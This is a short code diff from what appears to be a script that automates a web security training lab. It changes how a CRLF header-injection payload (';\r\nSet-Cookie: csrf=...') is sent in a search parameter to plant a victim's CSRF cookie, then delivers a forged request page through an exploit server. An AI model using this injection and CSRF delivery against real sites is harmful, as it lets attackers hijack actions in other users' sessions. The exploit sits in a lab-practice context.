@@ -15,8 +15,8 @@ def solve_lab(session):
     # Exploiting the arbitrary header injection vulnerability to set the
     # victim's "csrf" cookie
 
-    data = {"search": f";\r\nSet-Cookie: csrf={csrf}"}
-    req = Request("GET", session.url, data=data)
+    params = {"search": f";\r\nSet-Cookie: csrf={csrf}"}
+    req = Request("GET", session.url, params=params)
     body = generate_csrf_html(req)
     exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
 
